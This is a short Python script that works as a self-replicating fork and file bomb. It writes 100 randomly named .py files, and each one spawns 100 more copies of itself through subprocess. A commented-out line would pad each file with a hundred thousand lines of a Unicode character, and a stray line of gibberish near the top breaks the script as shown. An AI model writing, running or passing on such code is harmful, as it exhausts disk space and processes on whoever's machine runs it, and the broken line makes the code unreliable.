import random as r
import subprocess as s
import os

adkjghkudhgkuydhilbzfsiubgfdzldg

randoNum = 100000
name = os.path.basename(__file__)

contents = f'''
import {name} as m
import random as r
import subprocess as s

for a in range(100):
  i = r.randint(0, {randoNum})
  m.writeFile(f"{{i}}.py", m.contents)
  filename = "python " + str(i) + ".py"
  s.Popen(filename, shell=False)
  print(f"Created {{i}}.py!")

'''  # + "\'\'\'𪚥 \'\'\'\n"*100000


def writeFile(fileName, contents):
	fileContents = ""
	with open(fileName, 'w') as openFile:
		for i in contents:
			openFile.write(str(i))
			fileContents += str(i)


for a in range(100):
	i = r.randint(0, randoNum)
	writeFile(f"{i}.py", contents)
	filename = "python " + str(i) + ".py"
	s.Popen(filename, shell=True)
	print(f"Created {i}.py!")
